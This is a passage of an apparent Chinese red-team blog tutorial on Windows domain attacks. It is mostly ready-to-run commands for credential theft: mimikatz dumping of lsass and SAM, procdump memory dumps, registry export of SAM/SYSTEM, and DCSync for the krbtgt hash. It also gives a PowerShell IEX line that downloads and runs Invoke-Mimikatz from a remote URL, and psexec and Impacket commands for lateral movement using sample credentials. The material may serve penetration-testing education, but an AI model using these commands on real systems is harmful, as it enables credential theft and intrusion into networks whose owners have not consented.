+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302041414544.png"
+                      alt="image-20230204141425493"
+                ></p>
+<h5 id="在线读取lsass进程内存中的密码"><a href="#在线读取lsass进程内存中的密码" class="headerlink" title="在线读取lsass进程内存中的密码"></a>在线读取lsass进程内存中的密码</h5><p>privilege::debug 用于提升权限为DebugPrivilege</p>
+<p>sekurlsa::logonpasswords 用于导出用户凭据</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords full&quot; exit</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302041408881.png"
+                      alt="image-20230204140846773"
+                ></p>
+<h5 id="离线读取lsass进程内存中的密码"><a href="#离线读取lsass进程内存中的密码" class="headerlink" title="离线读取lsass进程内存中的密码"></a>离线读取lsass进程内存中的密码</h5><p>除了在线读取，也可以直接将 Isass.exe 的进程内存转储，将内存文件导出到本地后，使用 Mimikatz 进行离线读取。用于转储进程内存的工具有很多，如 OutMinidump.psl、Procdump、SharpDump 等，甚至可以手动加载系统自带的 comsvcs.dll 来实现内存转储。</p>
+<p>我们使用微软官方提供的Procdump工具先将lsass.exe进程转储</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">procdump64.exe -accepteula -ma lsass.exe lsass.dmp</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302041430302.png"
+                      alt="image-20230204143036227"
+                ></p>
+<p>把lsass.dmp放在mimikatz同目录下，然后使用mimikatz运行解密命令</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonpasswords full&quot; exit</span><br></pre></td></tr></table></figure></div>
+
+<p>sekurlsa::minidump lsass.dmp 用于加载内存文件</p>
+<p>sekurlsa::logonpasswords 用于导出用户凭据</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302041433859.png"
+                      alt="image-20230204143322782"
+                ></p>
+<h5 id="在线读取本地SAM文件保存的用户凭据"><a href="#在线读取本地SAM文件保存的用户凭据" class="headerlink" title="在线读取本地SAM文件保存的用户凭据"></a>在线读取本地SAM文件保存的用户凭据</h5><p>在线读取本地 SAM 文件将mimikatz.exe上传到目标主机,执行以下命令:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;token::elevate&quot; &quot;lsadump::sam&quot; exit</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li>privilege::debug 用于提升至DebugPrivilege权限</li>
+<li>token::elevate 用于提升至SYSTEM权限</li>
+<li>lsadump::sam 用于读取本地 SAM 文件</li>
+</ul>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302041447919.png"
+                      alt="image-20230204144620476"
+                ></p>
+<h5 id="注册表导出离线破解SAM文件"><a href="#注册表导出离线破解SAM文件" class="headerlink" title="注册表导出离线破解SAM文件"></a>注册表导出离线破解SAM文件</h5><p>lsass.exe同理，在管理员权限下执行以下命令，通过保存注册表的方式导出</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg save HKLM\SAM sam.hive</span><br><span class="line">reg save HKLM\SYSTEM system.hive</span><br></pre></td></tr></table></figure></div>
+
+<p>然后将导出的SAM和SYSTEM文件复制到同目录下,使用Mimikatz加载并读取SAM中的用户凭据信息。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302041450166.png"
+                      alt="image-20230204145056119"
+                ></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;lsadump::sam /sam:sam.hive /system:system.hive&quot; exit</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302041451973.png"
+                      alt="image-20230204145128909"
+                ></p>
+<h5 id="Powershell远程调用mimikatz"><a href="#Powershell远程调用mimikatz" class="headerlink" title="Powershell远程调用mimikatz"></a>Powershell远程调用mimikatz</h5><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell &quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;https://xxxxxxx/Invoke-Mimikatz.ps1&#x27;); Invoke-Mimikatz -DumpCreds&quot;</span><br></pre></td></tr></table></figure></div>
+
+<h5 id="MSF模块调用mimikatz"><a href="#MSF模块调用mimikatz" class="headerlink" title="MSF模块调用mimikatz"></a>MSF模块调用mimikatz</h5><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">load mimikatz</span><br><span class="line">wdigest //获取明文密码</span><br><span class="line">msv //获取所有Hash</span><br><span class="line">hashdump //类似</span><br></pre></td></tr></table></figure></div>
+
+<h5 id="CS插件调用mimikatz"><a href="#CS插件调用mimikatz" class="headerlink" title="CS插件调用mimikatz"></a>CS插件调用mimikatz</h5><p>点点点就OK</p>
+<h5 id="获取Krbtgt用户的Hash"><a href="#获取Krbtgt用户的Hash" class="headerlink" title="获取Krbtgt用户的Hash"></a>获取Krbtgt用户的Hash</h5><p>DCSync (mimikatz)：mimikatz会模拟域控，向目标域控请求账号密码信息。这种方式动静更小，不用直接登陆域控，也不需要提取NTDS.DIT文件。需要域管理员或者其他类似的高权限账户。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /user:krbtgt</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302041454070.png"
+                      alt="image-20230204145423008"
+                ></p>
+<p>在meterpreter中使用kiwi扩展也是一样的效果</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dcsync_ntlm krbtgt</span><br></pre></td></tr></table></figure></div>
+
+<p>LSA(mimikatz)：mimikatz 可以在域控的本地安全认证(Local Security Authority)上直接读取</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">lsadump::lsa /inject /name:krbtgt</span><br></pre></td></tr></table></figure></div>
+
+<p>Hashdump(MSF+CS)：一键即可</p>
+<h3 id="基于IPC的横向移动"><a href="#基于IPC的横向移动" class="headerlink" title="基于IPC的横向移动"></a>基于IPC的横向移动</h3><p>windows默认情况下开启的共享如下，当我们获取到可用于远程管理的账户时候，便可通过对ADMIN$目录建立IPC连接的方式远程连接到工作组或域内其他计算机，获取目标机器的控制权限。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302041500356.png"
+                      alt="image-20230204150023312"
+                ></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\IP /u:域名称\域账号 密码</span><br></pre></td></tr></table></figure></div>
+
+<p>这里需要注意只能使用被添加到远程计算机管理员组的域用户来远程连接，即默认情况下只有域管用户有权限对admin$目录建立IPC连接，其实本地的Administrator用户也可以，但是默认情况下该用户是被禁用的，如果启用了该用户，那么也可以使用Administrator用户远程连接.</p>
+<h5 id="PSEXEC管道横移"><a href="#PSEXEC管道横移" class="headerlink" title="PSEXEC管道横移"></a>PSEXEC管道横移</h5><p>一般我们用来反弹cmd，可先建立ipc连接再使用psexec无需输入密码</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net use \\IP /u:域名称\域账号 密码</span><br><span class="line">psexec.exe \\192.168.92.132 -s cmd.exe -acceptcula </span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302041507671.png"
+                      alt="image-20230204150747610"
+                ></p>
+<p>或者直接使用psexec连接</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\psexec.exe \\192.168.92.131 -u tset0\Administrator -p Server.2019 -s cmd.exe -ac</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302041508633.png"
+                      alt="image-20230204150845581"
+                ></p>
+<h5 id="Impacket实现横移"><a href="#Impacket实现横移" class="headerlink" title="Impacket实现横移"></a>Impacket实现横移</h5><p>Impacket是用于处理网络协议的 Python类 的集合。. Impacket专注于提供对数据包的简单编程访问，以及协议实现本身的某些协议</p>
+<ul>
+<li>smbexec.py</li>
+</ul>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbexec.py test0/administrator:Server.2019@192.168.92.131</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li>psexec.py与官方psexec.exe相比会自动删除服务，增加了隐蔽性</li>
+</ul>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec.py test0/administrator:Server.2019@192.168.92.131</span><br></pre></td></tr></table></figure></div>
+
+<p>或者直接执行命令</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec.py test0/administrator:Server.2019@192.168.92.131 ipconfig</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li>wmiexec.py</li>
+</ul>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmiexec.py test0/administrator:Server.2019@192.168.92.131 ipconfig</span><br></pre></td></tr></table></figure></div>
+
+            </div>
+
+            
+                <div class="post-copyright-info">
+                    <div class="article-copyright-info-container">
+    <ul>
+        <li>本文标题：域渗透攻防之域内信息搜集&amp;寻血猎犬BloodHound&amp;猕猴桃mimikatz&amp;转储密码和散列</li>
+        <li>本文作者：IcMl0x24</li>
+        <li>创建时间：2023-03-14 20:32:19</li>
+        <li>
+            本文链接：https://icml8.github.io/2023/03/14/hongri1/
+        </li>
+        <li>
+            版权声明：本博客所有文章除特别声明外，均采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> 许可协议。转载请注明出处！
+        </li>
+    </ul>
+</div>
+
+                </div>
+            
+
+            
+                <ul class="post-tags-box">
+                    
+                        <li class="tag-item">
+                            <a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%94%BB%E9%98%B2-BloodHound-mimikatz/">#域渗透攻防 BloodHound mimikatz</a>&nbsp;
+                        </li>
+                    
+                </ul>
+            
+
+            
+
+            
+                <div class="article-nav">
+                    
+                    
+                        <div class="article-next">
+                            <a class="next"
+                            rel="next"
+                            href="/2023/03/14/cs/"
+                            >
+                                <span class="title flex-center">
+                                    <span class="post-nav-title-item">红队攻击篇-Cobalt Strike帮助文档&amp;献给渗透测试人员的先进威胁战术(2023年2月9日更新版本)</span>
+                                    <span class="post-nav-item">下一篇</span>
+                                </span>
+                                <span class="right arrow-icon flex-center">
+                                    <i class="fa-solid fa-chevron-right"></i>
+                                </span>
+                            </a>
+                        </div>
+                    
+                </div>
+            
+
+
+            
+        </div>
+
+        
+            <div class="toc-content-container">
+                <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">此页目录</div>
+        <div class="page-title">域渗透攻防之域内信息搜集&amp;寻血猎犬BloodHound&amp;猕猴桃mimikatz&amp;转储密码和散列</div>
+        <ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%8D%E8%B4%A3%E5%A3%B0%E6%98%8E"><span class="nav-number">1.</span> <span class="nav-text">免责声明</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">2.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="nav-number">3.</span> <span class="nav-text">域内信息搜集</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E5%9F%9F%E7%8E%AF%E5%A2%83"><span class="nav-number">3.0.1.</span> <span class="nav-text">是否存在域环境</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BF%A1%E4%BB%BB%E5%9F%9F%E6%9C%89%E5%93%AA%E4%BA%9B%EF%BC%9F"><span class="nav-number">3.0.2.</span> <span class="nav-text">信任域有哪些？</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%9F%9F%E7%9A%84%E8%AF%A6%E7%BB%86%E6%83%85%E5%86%B5"><span class="nav-number">3.0.3.</span> <span class="nav-text">域的详细情况</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%9F%9F%E6%8E%A7%E7%9A%84%E4%B8%BB%E6%9C%BA%E5%90%8D"><span class="nav-number">3.0.4.</span> <span class="nav-text">域控的主机名</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%9F%9F%E7%AE%A1%E7%90%86%E7%94%A8%E6%88%B7"><span class="nav-number">3.0.5.</span> <span class="nav-text">域管理用户</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%9F%A5%E8%AF%A2%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8"><span class="nav-number">3.0.6.</span> <span class="nav-text">查询域控制器</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%9F%A5%E8%AF%A2%E5%9F%9F%E6%9C%BA%E5%99%A8"><span class="nav-number">3.0.7.</span> <span class="nav-text">查询域机器</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%9F%A5%E8%AF%A2%E5%9F%9F%E9%87%8C%E9%9D%A2%E7%9A%84%E7%BB%84"><span class="nav-number">3.0.8.</span> <span class="nav-text">查询域里面的组</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%9F%A5%E8%AF%A2%E5%9F%9F%E7%94%A8%E6%88%B7%E5%88%97%E8%A1%A8"><span class="nav-number">3.0.9.</span> <span class="nav-text">查询域用户列表</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E5%85%B1%E4%BA%AB"><span class="nav-number">3.0.10.</span> <span class="nav-text">查看共享</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%9F%9F%E5%86%85%E6%89%80%E6%9C%89%E7%94%A8%E6%88%B7SID"><span class="nav-number">3.0.11.</span> <span class="nav-text">域内所有用户SID</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AF%BB%E8%A1%80%E7%8C%8E%E7%8A%ACBloodHound"><span class="nav-number">4.</span> <span class="nav-text">寻血猎犬BloodHound</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%AE%89%E8%A3%85%E4%B8%8E%E9%87%87%E9%9B%86"><span class="nav-number">4.0.1.</span> <span class="nav-text">安装与采集</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%8A%82%E7%82%B9%E4%B8%8E%E4%BF%A1%E6%81%AF"><span class="nav-number">4.0.2.</span> <span class="nav-text">节点与信息</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%BE%B9%E7%BC%98%E4%B8%8E%E4%BC%A0%E9%80%92"><span class="nav-number">4.0.3.</span> <span class="nav-text">边缘与传递</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%95%B4%E4%BD%93%E9%A1%B5%E9%9D%A2%E5%8A%9F%E8%83%BD"><span class="nav-number">4.0.4.</span> <span class="nav-text">整体页面功能</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%8F%9C%E5%8D%95%E4%B8%8E%E6%90%9C%E7%B4%A2%E6%A0%8F"><span class="nav-number">4.0.5.</span> <span class="nav-text">菜单与搜索栏</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%9B%BE%E6%A0%87%E6%A0%B7%E5%BC%8F%E8%AF%B4%E6%98%8E"><span class="nav-number">4.0.6.</span> <span class="nav-text">图标样式说明</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%8A%82%E7%82%B9%E5%85%B3%E7%B3%BB%E8%AF%B4%E6%98%8E"><span class="nav-number">4.0.7.</span> <span class="nav-text">节点关系说明</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%8C%95%E7%8C%B4%E6%A1%83mimikatz"><span class="nav-number">5.</span> <span class="nav-text">猕猴桃mimikatz</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E5%89%8D%E6%B3%A8%E6%84%8F%E7%9A%84%E9%97%AE%E9%A2%98"><span class="nav-number">5.0.1.</span> <span class="nav-text">使用前注意的问题</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%9C%A8%E7%BA%BF%E8%AF%BB%E5%8F%96lsass%E8%BF%9B%E7%A8%8B%E5%86%85%E5%AD%98%E4%B8%AD%E7%9A%84%E5%AF%86%E7%A0%81"><span class="nav-number">5.0.2.</span> <span class="nav-text">在线读取lsass进程内存中的密码</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%A6%BB%E7%BA%BF%E8%AF%BB%E5%8F%96lsass%E8%BF%9B%E7%A8%8B%E5%86%85%E5%AD%98%E4%B8%AD%E7%9A%84%E5%AF%86%E7%A0%81"><span class="nav-number">5.0.3.</span> <span class="nav-text">离线读取lsass进程内存中的密码</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%9C%A8%E7%BA%BF%E8%AF%BB%E5%8F%96%E6%9C%AC%E5%9C%B0SAM%E6%96%87%E4%BB%B6%E4%BF%9D%E5%AD%98%E7%9A%84%E7%94%A8%E6%88%B7%E5%87%AD%E6%8D%AE"><span class="nav-number">5.0.4.</span> <span class="nav-text">在线读取本地SAM文件保存的用户凭据</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%B3%A8%E5%86%8C%E8%A1%A8%E5%AF%BC%E5%87%BA%E7%A6%BB%E7%BA%BF%E7%A0%B4%E8%A7%A3SAM%E6%96%87%E4%BB%B6"><span class="nav-number">5.0.5.</span> <span class="nav-text">注册表导出离线破解SAM文件</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Powershell%E8%BF%9C%E7%A8%8B%E8%B0%83%E7%94%A8mimikatz"><span class="nav-number">5.0.6.</span> <span class="nav-text">Powershell远程调用mimikatz</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#MSF%E6%A8%A1%E5%9D%97%E8%B0%83%E7%94%A8mimikatz"><span class="nav-number">5.0.7.</span> <span class="nav-text">MSF模块调用mimikatz</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#CS%E6%8F%92%E4%BB%B6%E8%B0%83%E7%94%A8mimikatz"><span class="nav-number">5.0.8.</span> <span class="nav-text">CS插件调用mimikatz</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96Krbtgt%E7%94%A8%E6%88%B7%E7%9A%84Hash"><span class="nav-number">5.0.9.</span> <span class="nav-text">获取Krbtgt用户的Hash</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8EIPC%E7%9A%84%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="nav-number">6.</span> <span class="nav-text">基于IPC的横向移动</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#PSEXEC%E7%AE%A1%E9%81%93%E6%A8%AA%E7%A7%BB"><span class="nav-number">6.0.1.</span> <span class="nav-text">PSEXEC管道横移</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Impacket%E5%AE%9E%E7%8E%B0%E6%A8%AA%E7%A7%BB"><span class="nav-number">6.0.2.</span> <span class="nav-text">Impacket实现横移</span></a></li></ol></li></ol></li></ol>
+
+    </div>
+</div>
+            </div>
+        
+    </div>
+</div>
+
+
+                
+
+            </div>
+
+
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info">
+            &copy;
+            
+              <span>2022</span>
+              -
+            
+            2023&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">IcMl0x24</a>
+        </div>
+        
+            <script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    <span id="busuanzi_container_site_uv" class="busuanzi_container_site_uv">
+                        访问人数&nbsp;<span id="busuanzi_value_site_uv" class="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="busuanzi_container_site_pv">
+                        总访问量&nbsp;<span id="busuanzi_value_site_pv" class="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            <span class="powered-by-container">由 <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" href="https://hexo.io">Hexo</a> 驱动</span>
+                <br> 
+            <span class="theme-version-container">主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v1.2.1</a>
+        </div>
+        
+        
+        
+            <div id="start_time_div" style="display:none">
+                2022/8/17 11:45:14
+            </div>
+            <div>
+                博客已运行 <span class="odometer" id="runtime_days" ></span> 天 <span class="odometer" id="runtime_hours"></span> 小时 <span class="odometer" id="runtime_minutes"></span> 分钟 <span class="odometer" id="runtime_seconds"></span> 秒
+            </div>
+        
+        
+        
+            <script async data-pjax>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="unfolded-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-expand-width flex-center">
+            <i class="fa-regular fa-expand"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="folded-tools-list">
+        <li class="right-bottom-tools tool-toggle-show flex-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+
+</main>
+
+
+
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/layouts/menu-shrink.js"></script>
+
+<script src="/js/tools/go-top-bottom.js"></script>
+
+<script src="/js/tools/dark-light-toggle.js"></script>
+
+
+
+
+
+    
+<script src="/js/tools/code-block.js"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/layouts/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js"></script>
+
+
+
+
+
+
+
+<div class="post-scripts pjax">
+    
+        
+<script src="/js/tools/toc-toggle.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+<script src="/js/layouts/toc.js"></script>
+
+<script src="/js/plugins/tabs.js"></script>
+
+    
+</div>
+
+
+    
+<script src="/js/libs/pjax.min.js"></script>
+
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+            // scrollTo: true,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            REDEFINE.utils.pjaxProgressBarStart();
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            REDEFINE.utils.pjaxProgressBarEnd();
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
+            REDEFINE.refresh();
+        });
+    });
+</script>
+
+
+
+
+</body>
+</html>
